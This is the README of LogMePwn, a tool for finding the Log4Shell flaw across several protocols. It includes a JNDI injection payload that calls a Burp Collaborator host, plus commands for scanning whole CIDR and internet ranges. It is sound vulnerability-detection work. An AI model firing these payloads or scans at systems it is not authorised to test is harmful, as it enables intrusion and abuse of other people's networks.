# LogMePwn
LogMePwn is a fully automated, multi-protocol, reliable, super-fast scanning and validation toolkit for the Log4J RCE CVE-2021-44228 vulnerability.

![image](https://user-images.githubusercontent.com/39941993/147484381-65b7e94a-9d71-41fe-a1d4-edc8afbedcf7.png)

## Tool Highlights
- Inherent support for automatic Canary Tokens generation using emails or webhooks.
- Multi-protocol support: HTTP, IMAP, SSH, FTP, etc.
- Support for multiple HTTP methods (GET, POST, PUT, DELETE, PATCH, etc) 
- Customized HTTP request body fuzzing (JSON, XML, etc).
- Custom callback server and payload support.
- CIDR range scanning.
- Everything is multi-threaded and super fast (its written in Go).
- ...and many more. Checkout the documentation and the tool below!

## How does it work?
LogMePwn works by making use of [Canary Tokens](https://canarytokens.org), which in-turn provides email and webhook notifications to your preferred communication channel. If you have a custom callback server, you can definitely use it too!

## Installation & Usage
To use the tool, you can grab a binary from the [Releases](https://github.com/0xInfection/LogMePwn/releases) section as per your distribution and use it. If you want to build the tool, you'll need Go >= 1.13. Simple clone the repo and run `go build`.

Here's the basic usage of the tool:
```powershell
$ ./lmp --help

    +---------------------+
    |   L o g M e P w n   |
    +---------------------+  v2.0

                ~ 0xInfection
Usage:
  -custom-server string
        Specify a custom callback server.
  -delay int
        Delay between subsequent requests for the same host to avoid overwhelming the host.
  -email string
        Email to use for the receiving callback notifications.
  -fbody string
        Specify a format string to use as the body of the HTTP request.
  -file string
        Specify a file containing list of hosts to scan.
  -ftp-ports string
        Comma separated list of HTTP ports to scan per target. (default "21")
  -headers string
        Comma separated list of HTTP headers to use; if empty a default set of headers are used.
  -headers-file string
        Specify a file containing custom set of headers to use in HTTP requests.
  -http-methods string
        Comma separated list of HTTP methods to use while scanning. (default "GET")
  -http-ports string
        Comma separated list of HTTP ports to scan per target. (default "80,443,8080")
  -imap-ports string
        Comma separated list of IMAP ports to scan per target. (default "143,993")
  -json
        Use body of type JSON in HTTP requests that can contain a body.
  -payload string
        Specify a single payload or a file containing list of payloads to use.
  -protocol string
        Specify a protocol to test for vulnerabilities. (default "all")
  -ssh-ports string
        Comma separated list of SSH ports to scan per target. (default "22")
  -threads int
        Number of threads to use while scanning. (default 10)
  -token string
        Canary token payload to use in requests; if empty, a new token will be generated.
  -user-agent string
        Custom user-agent string to use; if empty, payloads will be used.
  -webhook string
        Webhook to use for receiving callback notifications.
  -xml
        Use body of type XML in HTTP requests that can contain a body.

Examples:
  ./lmp -email alerts@testing.site 1.2.3.4 1.1.1.1:8080
  ./lmp -token xxxxxxxxxxxxxxxxxx -methods POST,PUT -fbody '<padding_here>%s<padding_here>' -headers X-Custom-Header
  ./lmp -webhook https://webhook.testing.site -file internet-ranges.lst -ports 8000,8888
  ./lmp -email alerts@testing.site -methods GET,POST,PUT,PATCH,DELETE 1.2.3.4:8880
  ./lmp -protocol imap -custom-server alerts.testing.local 1.2.3.4:143
```

### Specifying protocols
__NEW:__ This feature was introduced in v2.0.

With latest version support for multiple protocols has been introduced. So far we have 4 different protocols:
- HTTP
- IMAP
- SSH
- FTP

If you do not specify a protocol via the `-protocol` argument, the tool will run all the plugins for every supported protocol against the default set of ports mentioned.

[_See how to control ports for every protocol._](#specifying-targets)

Example:
```powershell
./lmp -protocol ftp -custom-server alerts.testing.local 1.2.3.4:21
./lmp -protocol ssh -custom-server alerts.testing.local 1.2.3.4:22
./lmp -token xxxxxxxxxxxxxxxx 1.2.3.4 # scans for all protocols on default ports
```

### Specifying targets
The targets can be specified in two ways, via the command line interface as arguments, or via a file.

__NEW:__ Now you can even pass CIDR ranges to scan! This feature was introduced in v1.1.

Example:
```s
./lmp <other args here> 1.1.1.1:8080 1.2.3.4:80 1.1.2.2:443
./lmp <other args here> -file internet-ranges.lst
./lmp <other args here> 192.168.0.0/26 1.2.3.4/30
```

Every protocol has a default supported list of ports associated which can be fine-tuned using the following flags:
- `-http-ports` for HTTP.
- `-imap-ports` for IMAP.
- `-ssh-ports` for SSH.
- `-ftp-ports` for FTP.

If the user mentions a host+port pair in form of `host:port`, the default list of ports is discarded and all checks are done for that specific port. If `-protocol` is not mentioned, all protocols' plugins will be tested against the same port.

### Specifying payloads
_This feature was introduced in v1.1._

You can specify a payload directly via the `-payload` argument directly. However if you want the DNS name of the host which is being tested in the payload, you can specify a formatting directive `$DNSNAME$` which will be replaced with the target against which the payload is being tested.

e.g. if you supply a command like this:
```js
./lmp -payload '${jndi:ldap://$DNSNAME$.xxx.burpcollaborator.net/a}' vulnerable.site.com
```
Then when sending a HTTP request to the URL, the payload would look like:
```sh
${jndi:ldap://vulnerable-site-com.xxx.burpcollaborator.net/a}
```
This feature would help you evaluate which hosts are vulnerable when doing black-box fuzzing.

You can also specify a payload containing multiple variations of the payload using the same argument. (See [`payloads-sample.txt`](payloads-sample.txt)). Example:
```js
./lmp -payload payloads-sample.txt vulnerable.site.com
```

> __NOTE:__ This feature doesn't work with Canary Tokens. Canarytokens doesn't support custom DNS formats.

### Specifying notification channels
> __NOTE__: If you're supplying a custom payload using `-payload`, specifying a notification channel is __NOT__ necessary. The payload itself should contain your callback server.

The notification channels can be any of the following:
- Email (`-email`)
- Webhook (`-webhook`)
- Custom DNS callback server (`-custom-server`)

The tool makes use of Canary Tokens, you can create one from [here](https://canarytokens.org/generate), or let the tool create a token for you. If the tool creates a token, that will be written to a file named `canarytoken-logmepwn.json`, which will include the token itself and the auth (both of which you'll need to view triggers via the web interface).

If you already have a token, you can use the `-token` argument to use the token directly and not create a new one.

> __NOTE:__ If you supply either an email or a webhook, the tool will create a custom canary token. If you use a custom callback server, tokens do not come into play.

### Sending requests
The tool offers great flexibility when sending requests. By default the tool uses GET requests. A default set of headers are used, each of which contains a payload in its value. You can specify a custom set of headers via the `-headers` argument. You can use the `-headers-file` switch to supply a file containing a list of headers. Examples:
```groovy
./lmp <other args> -headers 'X-Api-Version' 1.2.3.4:8080
./lmp <other args> -headers-file headers.txt 1.2.3.4:8080
```

You can specify the list of HTTP methods to use for scanning via the `-methods` switch. For requests that contain a body, e.g. `POST`, `PUT`, etc, you can customize content of the bodies.

By default the tool sends a payload directly via the body. The tool offers customization fo the body in the following ways:
- Specify `-json` to have the request body as type JSON.
- `-xml` for XML format.
- `-fbody` to specify a custom format string where the payload will be injected. This allows complex request creation when testing. For example, if you want to send the content as HTML, it can look like this:
  ```s
  ./lmp -fbody '<html>%s</html>' -methods 'POST,PUT' 1.2.3.4
  ```

You can specify a custom user-agent header value via the `-user-agent` switch.

### Concurrent scanning
The tool is optimized for scanning a wide range of targets. With sufficient amount of network bandwidth and hardware, you can scan the entire IPv4 space within a day. The default number of concurrent threads to use while scanning is set at just 10 (optimised for reliability on local hardware). The value can go upto thousands (I'll leave the benchmarking task upto you). :)

Use the `-threads` switch to supply the number of threads to use with the tool.

### Specifying delay
Since a lot of HTTP requests are involved, it might be a cumbersome job for the remote host to handle the requests. The `-delay` parameter is here to help you with those cases. You can specify a delay value in seconds -- which will be used be used in between two subsequent requests to the same port on a server.

## Demo
To demo the scanner, I make use of a vulnerable setup from [@christophetd](https://twitter.com/christophetd) using docker:
```js
docker run -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
```
![image](https://user-images.githubusercontent.com/39941993/146034544-a0c0e60d-00db-44ae-823a-5e5834888108.png)

Then I run the tool against the setup:
```js
./lmp -email alerts@testing.site -protocol http 127.0.0.1:8080
```
![image](https://user-images.githubusercontent.com/39941993/146034732-5600761b-008e-4119-83ce-b5b0f6686b7d.png)

Which immediately triggered a few DNS lookups visible on the token history page as well as my email:

<img src="https://user-images.githubusercontent.com/39941993/146039240-0d34e4d8-284f-4377-bde3-ea13f9f7f5eb.png" width=49% /> <img src="https://user-images.githubusercontent.com/39941993/146039600-ab2a71b1-ec92-4cef-bae4-f3f46dc2ffd6.png" width=49% />

### Changelog
- Updates in version v2.0:
  - Introducing multi-protocol support. Protocols implemented so far:
    - SSH
    - IMAP
    - HTTP
    - FTP

- Updates in version v1.1:
  - Ability to specify custom payloads via file or command line.
  - Ability to specify custom headers via file.
  - CIDR range scanning.

## Ideas & future roadmap
Feel free to hit me up on [Twitter](https://twitter.com/0xinfection) or create an issue or PR.

## License & Version
The tool is licensed under the GNU GPLv3. LogMePwn is currently at v2.0.

## Credits
Shoutout to the team at [Thinkst Canary](https://canary.tools/) for their amazing Canary Tokens project.

> Crafted with ♡ by [Pinaki (@0xInfection)](https://twitter.com/0xinfection).
